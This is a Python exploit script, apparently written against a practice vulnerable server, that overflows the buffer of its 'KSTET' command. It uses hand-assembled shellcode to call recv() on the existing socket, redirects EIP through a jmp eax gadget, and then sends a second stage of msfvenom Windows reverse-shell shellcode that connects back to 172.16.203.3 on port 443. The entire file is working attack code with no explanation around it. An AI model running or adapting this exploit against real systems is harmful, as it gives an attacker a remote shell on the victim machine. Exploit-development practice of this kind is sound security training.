import sys
import socket
import time

# Vulnerable command
command = "KSTET "
server = "172.16.203.5"
port = 9999

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.203.3 LPORT=443 -b '\x00' -f python -v shell
# 351 bytes
shell =  b""
shell += b"\xbe\xc1\x99\x0d\xc1\xdb\xdb\xd9\x74\x24\xf4\x5d"
shell += b"\x33\xc9\xb1\x52\x31\x75\x12\x83\xc5\x04\x03\xb4"
shell += b"\x97\xef\x34\xca\x40\x6d\xb6\x32\x91\x12\x3e\xd7"
shell += b"\xa0\x12\x24\x9c\x93\xa2\x2e\xf0\x1f\x48\x62\xe0"
shell += b"\x94\x3c\xab\x07\x1c\x8a\x8d\x26\x9d\xa7\xee\x29"
shell += b"\x1d\xba\x22\x89\x1c\x75\x37\xc8\x59\x68\xba\x98"
shell += b"\x32\xe6\x69\x0c\x36\xb2\xb1\xa7\x04\x52\xb2\x54"
shell += b"\xdc\x55\x93\xcb\x56\x0c\x33\xea\xbb\x24\x7a\xf4"
shell += b"\xd8\x01\x34\x8f\x2b\xfd\xc7\x59\x62\xfe\x64\xa4"
shell += b"\x4a\x0d\x74\xe1\x6d\xee\x03\x1b\x8e\x93\x13\xd8"
shell += b"\xec\x4f\x91\xfa\x57\x1b\x01\x26\x69\xc8\xd4\xad"
shell += b"\x65\xa5\x93\xe9\x69\x38\x77\x82\x96\xb1\x76\x44"
shell += b"\x1f\x81\x5c\x40\x7b\x51\xfc\xd1\x21\x34\x01\x01"
shell += b"\x8a\xe9\xa7\x4a\x27\xfd\xd5\x11\x20\x32\xd4\xa9"
shell += b"\xb0\x5c\x6f\xda\x82\xc3\xdb\x74\xaf\x8c\xc5\x83"
shell += b"\xd0\xa6\xb2\x1b\x2f\x49\xc3\x32\xf4\x1d\x93\x2c"
shell += b"\xdd\x1d\x78\xac\xe2\xcb\x2f\xfc\x4c\xa4\x8f\xac"
shell += b"\x2c\x14\x78\xa6\xa2\x4b\x98\xc9\x68\xe4\x33\x30"
shell += b"\xfb\xa7\xd4\xf1\xf8\xdf\xd6\x05\xfe\xa4\x5e\xe3"
shell += b"\x6a\xcb\x36\xbc\x02\x72\x13\x36\xb2\x7b\x89\x33"
shell += b"\xf4\xf0\x3e\xc4\xbb\xf0\x4b\xd6\x2c\xf1\x01\x84"
shell += b"\xfb\x0e\xbc\xa0\x60\x9c\x5b\x30\xee\xbd\xf3\x67"
shell += b"\xa7\x70\x0a\xed\x55\x2a\xa4\x13\xa4\xaa\x8f\x97"
shell += b"\x73\x0f\x11\x16\xf1\x2b\x35\x08\xcf\xb4\x71\x7c"
shell += b"\x9f\xe2\x2f\x2a\x59\x5d\x9e\x84\x33\x32\x48\x40"
shell += b"\xc5\x78\x4b\x16\xca\x54\x3d\xf6\x7b\x01\x78\x09"
shell += b"\xb3\xc5\x8c\x72\xa9\x75\x72\xa9\x69\x85\x39\xf3"
shell += b"\xd8\x0e\xe4\x66\x59\x53\x17\x5d\x9e\x6a\x94\x57"
shell += b"\x5f\x89\x84\x12\x5a\xd5\x02\xcf\x16\x46\xe7\xef"
shell += b"\x85\x67\x22"


# some padding
setrecv = "\x41" * 2

# Creating socket descriptor
setrecv += "\x54"                       # push esp
setrecv += "\x58"                       # pop eax
setrecv += "\x66\x05\x94\x01"           # add ax, 0x194

# Stack Alignment
setrecv += "\x83\xec\x50"			# sub esp, 0x50

# Flags = 0x00000000
setrecv += "\x31\xd2"			    # xor edx,edx
setrecv += "\x52"				      # push edx

# BufSize = 0x00000200
setrecv += "\x80\xc6\x02"			# add dh, 0x02
setrecv += "\x52"				      # push edx

# Buffer at 0x00C0F9F0
setrecv += "\x54"				      # push esp
setrecv += "\x5b"				      # pop ebx
setrecv += "\x83\xc3\x4c"			# add ebx, 0x4c
setrecv += "\x53"				      # push ebx

# Push socket descriptor onto the stack:
setrecv += "\xFF\x30"			# push dword ptr ds:[eax]

# Calling W2_32.recv()
setrecv += "\xB8\x11\x2C\x25\x40"      # mov eax, 0x40252C11
setrecv += "\xc1\xe8\x08"              # shr eax, 0x08
setrecv += "\xff\xd0"                  # call eax

# 70 byte offset to EIP
paddingeip = "\x41" * (70-len(setrecv))     # offset to EIP
     

eax = "\xb1\x11\x50\x62"			     # 0x625011b1 jmp eax essfunc.dll
crash = "\x43" * (2000-len(setrecv+paddingeip+eax))  # remaining bytes to crash



s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))

## first stage
stage1 = command + setrecv + paddingeip + eax + crash
s.send(stage1)

time.sleep(2)

## second stage
stage2 = "\x90" * 40 + shell + "\x90" * (512- len(shell) - 40)
s.send(stage2)

s.close()
